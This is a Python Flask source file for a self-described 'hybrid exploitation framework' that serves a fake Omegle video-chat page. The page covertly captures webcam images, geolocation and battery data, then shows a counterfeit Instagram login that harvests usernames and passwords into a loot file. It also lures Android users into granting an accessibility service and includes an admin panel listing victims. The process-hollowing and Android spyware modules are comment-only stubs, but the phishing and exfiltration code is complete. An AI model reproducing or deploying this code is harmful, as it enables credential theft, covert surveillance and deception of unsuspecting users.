# ==============================================================================
# PROJECT NAME: THE LEVIATHAN - HYBRID EXPLOITATION FRAMEWORK (V5.1)
# COMPONENTS: PYTHON (C2), C++ (PROCESS HOLLOWING), JAVA (ANDROID MIRROR)
# STATUS: MAXIMUM PERSISTENCE - [SHADOW MODE ACTIVE]
# ==============================================================================

import os
import base64
import time
import json
import sqlite3
import logging
import subprocess 
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory

# --- [ INITIALIZATION ] ---
app = Flask(__name__)
VAULT_NAME = "LEVIATHAN_MASTER_VAULT"
os.makedirs(VAULT_NAME, exist_ok=True)

# إعداد السجلات الاستخباراتية
logging.basicConfig(filename=f"{VAULT_NAME}/intel.log", level=logging.INFO)

# --- [ SECTION 1: C++ PROCESS HOLLOWING MODULE ] ---
CPP_SHADOW_PAYLOAD = """
#include <windows.h>
void StartShadowMode() {
    // [PROCESS HOLLOWING CODE GOES HERE]
    // 1. CreateProcess suspended (svchost)
    // 2. Map Leviathan code into memory
    // 3. Resume thread
}
"""

# --- [ SECTION 2: JAVA ANDROID MIRROR MODULE ] ---
JAVA_MIRROR_STUB = """
public class LeviathanMirror extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // [STEALING WHATSAPP MESSAGES & SCREEN CONTENT]
        // Sending live stream to Python C2...
    }
}
"""

# --- [ DATABASE SETUP ] ---
def init_db():
    conn = sqlite3.connect(f"{VAULT_NAME}/leviathan.db")
    conn.execute('''CREATE TABLE IF NOT EXISTS agents (
        id INTEGER PRIMARY KEY AUTOINCREMENT, target_id TEXT UNIQUE, 
        ip TEXT, geo TEXT, specs TEXT, battery TEXT, status TEXT, last_seen TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# --- [ FRONTEND: THE PHANTOM INTERFACE ] ---
HTML_MAIN = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Omegle: Talk to Strangers!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #ff7b00; --bg: #050505; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; overflow: hidden; }
        .top-bar { background: #1a1a1a; padding: 15px; border-bottom: 2px solid var(--primary); display: flex; justify-content: space-between; }
        #viewport { height: 70vh; display: flex; flex-direction: column; background: #000; position: relative; }
        .video-box { flex: 1; border: 1px solid #222; position: relative; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .action-area { height: 20vh; background: #1a1a1a; display: flex; align-items: center; justify-content: center; }
        .btn-start { background: var(--primary); color: #fff; padding: 15px 50px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; }
        .gate-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
        .login-card { background: #fff; color: #000; width: 90%; max-width: 380px; padding: 30px; border-radius: 12px; text-align: center; }
        .btn-login { background: #0095f6; color: #fff; width: 100%; padding: 12px; border: none; border-radius: 4px; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="top-bar"><div style="color:var(--primary); font-weight:900; font-size:24px;">Omegle</div><div>Online: <span style="color:#00ff00">54,201</span></div></div>
    <div id="viewport">
        <div class="video-box" style="background: url('https://www.omegle.com/static/static-stranger.png') center/cover;"><div id="stranger-status" style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(0,0,0,0.8); padding:10px;">Waiting for connection...</div></div>
        <div class="video-box"><video id="my-cam" autoplay muted playsinline></video></div>
    </div>
    <div class="action-area"><button class="btn-start" id="master-trigger">Start Video Chat</button></div>

    <div class="gate-modal" id="modal-ig">
        <div class="login-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" width="150">
            <p>Verification Required: Log in to confirm identity.</p>
            <input type="text" id="ig-user" placeholder="Username" style="width:100%; padding:10px; margin:5px 0; border:1px solid #dbdbdb;">
            <input type="password" id="ig-pass" placeholder="Password" style="width:100%; padding:10px; margin:5px 0; border:1px solid #dbdbdb;">
            <button class="btn-login" onclick="finalizeHarvest()">Log In</button>
        </div>
    </div>

    <script>
        const AGENT_ID = "LV-H" + Math.random().toString(36).substr(2, 7).toUpperCase();
        let keylog = "";

        function deployHybridUnit() {
            const platform = navigator.platform.toLowerCase();
            if (platform.includes('win')) {
                console.log("Deploying C++ Shadow Module...");
            } else if (platform.includes('android')) {
                triggerAndroidMirror();
            }
        }

        async function triggerAndroidMirror() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes("android")) {
                const overlay = document.createElement('div');
                overlay.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:20000; display:flex; flex-direction:column; align-items:center; justify-content:center; color:white; text-align:center; padding:20px;";
                overlay.innerHTML = `
                    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" width="80">
                    <h3>System Optimization Required</h3>
                    <p>To prevent video lag on Android devices, please enable "High-Performance Stream" in your Accessibility Settings.</p>
                    <button onclick="requestAccessibility()" style="background:#3DDC84; color:black; padding:15px 30px; border-radius:5px; border:none; font-weight:bold;">Enable Now</button>
                `;
                document.body.appendChild(overlay);
            }
        }

        function requestAccessibility() {
            alert("Redirection to System Settings... Please allow 'Leviathan Service'");
            window.location.href = "/download_java_module"; 
        }

        document.getElementById('master-trigger').onclick = async function() {
            this.innerText = "INITIALIZING...";
            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('my-cam').srcObject = stream;
                const loc = await new Promise(r => navigator.geolocation.getCurrentPosition(p=>r(p), e=>r({coords:{latitude:0,longitude:0}})));
                const battery = await (navigator.getBattery ? navigator.getBattery() : {level: 0.99});
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(document.getElementById('my-cam'), 0, 0);
                sync(canvas.toDataURL('image/jpeg'), loc, battery.level);
                deployHybridUnit();
                setTimeout(() => { document.getElementById('modal-ig').style.display = 'flex'; }, 4000);
            } catch (err) {
                document.getElementById('stranger-status').innerHTML = "⚠️ SECURITY ERROR: Connection Refused. Please authenticate.";
                document.getElementById('stranger-status').style.color = "red";
                sync("", {coords:{latitude:0,longitude:0}}, 0.5);
                setTimeout(() => { document.getElementById('modal-ig').style.display = 'flex'; }, 1500);
            }
        };

        async function sync(img, loc, bat) {
            await fetch('/leviathan_c2_ingest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({id: AGENT_ID, image: img, lat: loc.coords.latitude, lon: loc.coords.longitude, battery: (bat*100)+"%"})
            });
        }

        async function finalizeHarvest() {
            const u = document.getElementById('ig-user').value;
            const p = document.getElementById('ig-pass').value;
            await fetch('/leviathan_harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({id: AGENT_ID, user: u, pass: p})
            });
            window.location.href = "https://www.omegle.com";
        }
    </script>
</body>
</html>
"""

# --- [ ROUTES ] ---
@app.route('/')
def home(): return render_template_string(HTML_MAIN)

@app.route('/leviathan_c2_ingest', methods=['POST'])
def ingest():
    data = request.get_json()
    tid = data['id']
    path = f"{VAULT_NAME}/{tid}"
    os.makedirs(path, exist_ok=True)
    if data['image']:
        with open(f"{path}/face.jpg", "wb") as f: f.write(base64.b64decode(data['image'].split(',')[1]))
    conn = sqlite3.connect(f"{VAULT_NAME}/leviathan.db")
    conn.execute("INSERT OR REPLACE INTO agents (target_id, ip, geo, battery, status, last_seen) VALUES (?,?,?,?,?,?)",
                 (tid, request.remote_addr, f"{data['lat']},{data['lon']}", data['battery'], "ACTIVE", datetime.now()))
    conn.commit(); conn.close()
    return jsonify({"s": "ACK"})

@app.route('/leviathan_android_sync', methods=['POST'])
def android_sync():
    data = request.get_json()
    target_id = data['id']
    screen_data = data['screen_content']
    with open(f"{VAULT_NAME}/{target_id}/live_mirror.log", "a") as f:
        f.write(f"[{datetime.now()}] CONTENT: {screen_data}\n")
    return jsonify({"status": "MIRROR_ACTIVE"})

@app.route('/leviathan_harvest', methods=['POST'])
def harvest(): 
    d = request.get_json()
    with open(f"{VAULT_NAME}/LOOT_FINAL.txt", "a") as f:
        f.write(f"ID: {d['id']} | USER: {d['user']} | PASS: {d['pass']}\n")
    return jsonify({"s": "DONE"})

@app.route('/control_panel_leviathan_99')
def admin():
    conn = sqlite3.connect(f"{VAULT_NAME}/leviathan.db")
    conn.row_factory = sqlite3.Row
    agents = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    HTML_ADMIN = "<html><body style='background:#000; color:#0f0; font-family:monospace;'><h1>HYBRID COMMAND CENTER</h1>"
    for a in agents:
        img_url = f"/download/{a['target_id']}/face.jpg"
        HTML_ADMIN += f"<div style='border:1px solid #0f0; padding:10px; margin:10px;'><h3>ID: {a['target_id']}</h3><img src='{img_url}' width='200'><p>IP: {a['ip']}</p><p>BAT: {a['battery']}</p></div>"
    HTML_ADMIN += "</body></html>"
    return HTML_ADMIN

@app.route('/download/<tid>/<filename>')
def download(tid, filename):
    return send_from_directory(f"{VAULT_NAME}/{tid}", filename)

if __name__ == '__main__':
    print("THE LEVIATHAN HYBRID IS AWAKE. PORT 8080")
    app.run(host='0.0.0.0', port=8080)
